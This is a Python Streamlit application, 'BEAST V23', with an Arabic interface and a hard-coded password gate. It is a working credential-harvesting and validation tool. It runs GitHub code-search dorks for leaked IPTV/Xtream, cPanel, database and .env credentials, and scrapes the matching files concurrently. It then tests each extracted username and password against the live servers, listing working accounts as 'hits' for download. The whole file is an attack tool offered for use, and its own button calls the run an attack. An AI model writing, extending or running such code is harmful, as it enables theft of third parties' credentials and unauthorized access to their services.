import streamlit as st
import requests
import re
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

st.set_page_config(page_title="BEAST V23 - INFINITE PAGES DORKS", layout="wide")

# نظام الدخول
if "auth" not in st.session_state:
    st.session_state.auth = False

if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V23 - INFINITE SCAN</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# تنسيق الألوان
st.markdown("""
<style>
    .stApp { background-color: #000; }
    .scan-log { color: #00d4ff; font-family: monospace; font-size: 13px; margin: 0; padding: 2px; }
    .active-hit {
        background: #0d1117; border: 1px solid #00ff41;
        padding: 10px; border-radius: 5px; margin-bottom: 5px;
    }
    .text-green { color: #00ff41; font-weight: bold; }
    .text-yellow { color: #fbbf24; }
    .text-white { color: #fff; font-family: monospace; }
</style>
""", unsafe_allow_html=True)

with st.sidebar:
    st.title("⚡ BEAST V23")
    token = st.text_input("GitHub Token:", type="password")
    max_workers = st.slider("عدد الخيوط المتوازية ⚡ (زيادة = نتائج أسرع)", 5, 50, 20)
    start = st.button("🚀 ابدأ الهجوم المباشر (صفحات لانهائية)")
    st.info("سيتم جلب كل الصفحات المتاحة لكل dork تلقائياً حتى نفاد النتائج")

st.subheader("📡 الرادار المباشر")
radar_area = st.empty()

st.subheader("🏆 النتائج الشغالة (Hits)")
hits_area = st.container()

if start and token:
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}

    # قائمة دروكس موسعة جداً (أكثر من 20)
    dorks = [
        'extension:txt "get.php?username=" "password="',
        'extension:m3u "player_api.php"',
        'extension:txt "portal.php?username="',
        'extension:php "username" "password" "server" "port"',
        'extension:json "server" "username" "password"',
        'extension:cfg "xtream" "user" "pass"',
        'extension:conf "enigma2" "http" "user"',
        'extension:txt "http://" "user" "pass" "panel"',
        'extension:xml "streaming" "auth"',
        'extension:log "login" "password" "iptv"',
        'path:.env "XTREAM"',
        'path:config.php "db_user" "db_pass"',
        'extension:sql "INSERT INTO users" "password"',
        'extension:txt "xtreamui" "admin"',
        'extension:txt "cpanel" "host" "user" "pass"',
        'extension:conf "stream" "login"',
        'extension:yaml "iptv" "credentials"',
        'extension:ini "portal" "username"',
        'extension:txt "http://" "8080" "username" "password"',
        'extension:txt "http://" "25461" "username" "password"',
        'extension:txt "panel_api.php?username="',
        '"player_api.php?username=" extension:php',
    ]

    found_count = 0
    hits_list = []  # لتجميع الـ hits

    for dork in dorks:
        page = 1
        more_pages = True
        while more_pages:
            try:
                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
                res = requests.get(search_url, headers=headers).json()

                if "items" not in res:
                    radar_area.warning(f"⏳ Rate limit أو خطأ: {res.get('message', '')} - ننتظر 15 ثانية")
                    time.sleep(15)
                    continue

                items = res.get("items", [])
                if not items:
                    more_pages = False  # لا مزيد من الصفحات لهذا الـ dork
                    break

                # معالجة العناصر
                radar_area.info(f"🔎 {dork[:50]}... | الصفحة {page} | {len(items)} ملف")

                # استخراج الروابط الخام
                raw_urls = []
                for item in items:
                    raw = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    raw_urls.append(raw)

                # فحص متوازي لكل ملف (سحب المحتوى ثم البحث)
                def process_file(raw_url):
                    try:
                        content = requests.get(raw_url, timeout=5).text
                        matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:\d+)/[a-zA-Z\._-]+\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                        return [(host, user, pw) for host, user, pw in matches]
                    except:
                        return []

                with ThreadPoolExecutor(max_workers=min(max_workers, len(raw_urls))) as executor:
                    future_to_url = {executor.submit(process_file, url): url for url in raw_urls}
                    for future in as_completed(future_to_url):
                        creds = future.result()
                        for host, user, pw in creds:
                            # فحص سريع للسيرفر (يتطلب اتصال)
                            radar_area.markdown(f"<p class='scan-log'>🔄 Checking: {host} | {user}</p>", unsafe_allow_html=True)
                            try:
                                check_url = f"{host}/player_api.php?username={user}&password={pw}"
                                r = requests.get(check_url, timeout=3).json()
                                if r.get("user_info", {}).get("status") == "Active":
                                    found_count += 1
                                    hit_text = f"""
                                    <div class="active-hit">
                                        <span class="text-green">✅ HIT #{found_count}</span><br>
                                        <span class="text-white">HOST: {host}</span><br>
                                        <span class="text-yellow">USER: {user} | PASS: {pw}</span>
                                    </div>
                                    """
                                    with hits_area:
                                        st.markdown(hit_text, unsafe_allow_html=True)
                                    hits_list.append((host, user, pw))
                            except:
                                continue

                page += 1
                time.sleep(0.5)  # مهلة صغيرة بين الصفحات

            except Exception as e:
                radar_area.error(f"خطأ في الصفحة {page}: {str(e)}")
                time.sleep(5)

    st.success(f"✅ اكتمل البحث! إجمالي الـ HITS: {found_count} من {len(dorks)} Dork")
    if hits_list:
        st.download_button("📥 تحميل النتائج (TXT)", "\n".join([f"{h[0]}|{h[1]}|{h[2]}" for h in hits_list]), "beast_hits.txt")
